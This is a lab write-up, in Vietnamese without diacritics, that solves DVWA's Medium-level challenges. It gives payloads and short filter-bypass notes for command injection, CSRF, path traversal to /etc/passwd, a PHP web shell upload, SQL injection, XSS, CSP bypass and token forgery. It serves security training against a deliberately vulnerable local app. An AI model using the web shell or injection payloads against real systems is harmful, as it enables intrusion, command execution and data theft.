# DVWA - Security Level: Medium  

## 1. Brute Force
Su dung **BurpSuite** bat goi tin khi thuc hien chuc nang **Login**:  
  
![Brute Force_1](https://github.com/ckiev5/DVWA/blob/main/Images/Medium%20Level/Brute%20Force_1.png)  
  
Su dung chuc nang **Intruder**, de tan cong brute force tim kiem mat khau cua tai khoan **admin**  
**Result:**  
O muc do **Medium**, moi lan dang nhap sai se phai doi 2s, viec nay khong chong lai duoc tan cong brute froce nhung co the lam tang thoi gian thuc hien.  
Tai khoan: **admin**  
Mat khau: **password**  
## 2. Command Injection
**Payload**  
```
|| whoami
```
**Result:**  
Chuc nang **Ping a device** da thuc hien loc, loai bo cac ky tu **";" va "&&"**. Nhung bo sot doi voi ky tu **"||"**.  
  
![Command Injection_1](https://github.com/ckiev5/DVWA/blob/main/Images/Medium%20Level/Command%20Injection_1.png)
  
## 3. CSRF
**Payload**  
```
<img src="http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=abc123&password_conf=abc123&Change=Change">/img>
```
**Result:**  
Su dung lo hong XSS (Reflected):
  
![CSRF_1](https://github.com/ckiev5/DVWA/blob/main/Images/Medium%20Level/CSRF_1.png)
      
## 4. File Inclusion
**Payload**  
```
http://127.0.0.1/DVWA/vulnerabilities/fi/?page=....//....//....//....//....//....//etc/passwd
```
**Result:**  
He thong da thuc hien kiem soat input bang cach loai bo chuoi ky tu **"../"** trong du lieu input, nhung chua loai bo hoan toan:  
  
![File Inclusion_1](https://github.com/ckiev5/DVWA/blob/main/Images/Medium%20Level/File%20Inclusion_1.png)  
  
## 5. File Upload
**Payload**  
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```
**Result:**  
He thong da chan, chi cho phep upload file JPEG hoac PNG images:  
  
![File Upload_1](https://github.com/ckiev5/DVWA/blob/main/Images/Medium%20Level/File%20Upload_1.png)  
  
Su dung Burp Suite bat goi tin khi thuc hien upload file shell.png:  
  
![File Upload_2](https://github.com/ckiev5/DVWA/blob/main/Images/Medium%20Level/File%20Upload_2.png)  
  
Thay doi ten va noi dung file shell.png:  
  
![File Upload_3](https://github.com/ckiev5/DVWA/blob/main/Images/Medium%20Level/File%20Upload_3.png)  
  
Upload thanh cong:  
  
![File Upload_4](https://github.com/ckiev5/DVWA/blob/main/Images/Medium%20Level/File%20Upload_4.png)  
  
## 6. Insecure CAPTCHA
**Payload**:  
  
![Insecure CAPTCHA_1](https://github.com/ckiev5/DVWA/blob/main/Images/Medium%20Level/Insecure%20CAPTCHA_1.png)  
  
**Result:**  
Tuong tu nhu voi muc do Low, chi can gui request **step 2** voi **passed_captcha=true**.  
## 7. SQL Injection
**Payload**  
```
1 UNION SELECT user, password FROM users-- -
```
**Result:**  
Su dung **Burp Suite** chan goi tin khi chon **Submit**:  
  
![SQL Injection_1](https://github.com/ckiev5/DVWA/blob/main/Images/Medium%20Level/SQL%20Injection_1.png)  
  
Thay doi gia tri **ID**:  
  
![SQL Injection_2](https://github.com/ckiev5/DVWA/blob/main/Images/Medium%20Level/SQL%20Injection_2.png)  
  
## 8. SQL Injection (Blind)
**Payload**  
```
1 AND SLEEP(1)-- -
```
**Result:**  
  
![SQL Injection (Blind)\_1](https://github.com/ckiev5/DVWA/blob/main/Images/Medium%20Level/SQL%20Injection%20(Blind)_1.png)  
  
## 9. Weak Session IDs  
**Result:**  
Khi **Generate**, gia tri **dvwaSession** duoc tao ra moi lan khac nhau:  
  
![Weak Session IDs_1](https://github.com/ckiev5/DVWA/blob/main/Images/Medium%20Level/Weak%20Session%20IDs_1.png)  
  
Gia tri **dvwaSession** tuong ung voi gia tri **time stamp** khi duoc tao:  
  
![Weak Session IDs_2](https://github.com/ckiev5/DVWA/blob/main/Images/Medium%20Level/Weak%20Session%20IDs_2.png)  
  
## 10. XSS (DOM)
**Payload**  
```
>/option></select><img src='x' onerror='alert(1)'>
```
**Result:**  
Tag **<script** bi loai bo, su dung tag **img** kem theo dong cac tag **option, select**:   
  
![XSS (DOM)\_1](https://github.com/ckiev5/DVWA/blob/main/Images/Medium%20Level/XXS%20(DOM)_1.png)  
  
## 11. XSS (Reflected)
**Payload**  
```
<scripT> alert(1) </Script>
```
**Result:**  
  
![XSS (Reflected)\_1](https://github.com/ckiev5/DVWA/blob/main/Images/Medium%20Level/XXS%20(Reflected)_1.png)  
  
## 12. XSS (Stored)
**Payload**  
```
<img src='x' onerror='alert(1)'>
```
**Result:**  
Thay doi thong so **maxlength** cua o input **name**:  
  
![XSS (Stored)\_1](https://github.com/ckiev5/DVWA/blob/main/Images/Medium%20Level/XXS%20(Stored)_1.png)  
  
Chen **payload** vao o input **name**:  
![XSS (Stored)\_2](https://github.com/ckiev5/DVWA/blob/main/Images/Medium%20Level/XXS%20(Stored)_2.png)  
  
## 13. CSP Bypass
**Payload**  
Co the chay script tu cac nguon sau:  
```
Content-Security-Policy
	script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';
```
**Result:**  
Upload file **csp.js** bang chuc nang **File Upload**:  
**csp.js**
```  
alert('CSP')
```  
He thong van cho phep chay script tren server voi gia tri **nonce** trung voi gia tri **nonce** trong **Content-Security-Policy**:  
```  
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=" src="../../hackable/uploads/csp.js"></script>  
```  
![CSP Bypass_1](https://github.com/ckiev5/DVWA/blob/main/Images/Medium%20Level/CSP%20Bypass_1.png)  
  
## 14. JavaScript
Tuong tu nhu cap do Low, **token** duoc tao bang script sau:  
```  
function do_something(e) {
    for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
    return t
}
setTimeout(function() {
    do_elsesomething("XX")
}, 300);

function do_elsesomething(e) {
    document.getElementById("token").value = do_something(e + document.getElementById("phrase").value + "XX")
}
```  
**Payload**  
```
token=XXsseccusXX&phrase=success&send=Submit
```
**Result:**  
  
![JavaScript_1](https://github.com/ckiev5/DVWA/blob/main/Images/Medium%20Level/JavaScript_1.png) 
  
  
